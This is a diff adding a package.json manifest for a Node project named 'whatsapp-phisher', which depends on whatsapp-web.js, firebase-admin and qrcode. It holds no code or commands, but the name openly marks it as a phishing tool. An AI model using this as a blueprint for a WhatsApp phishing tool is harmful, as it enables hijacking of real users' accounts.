@@ -1,0 +1,9 @@
+{
+    "name": "whatsapp-phisher",
+    "version": "1.0.0",
+    "dependencies": {
+        "whatsapp-web.js": "^1.23.0",
+        "firebase-admin": "^11.0.0",
+        "qrcode": "^1.5.3"
+    }
+}
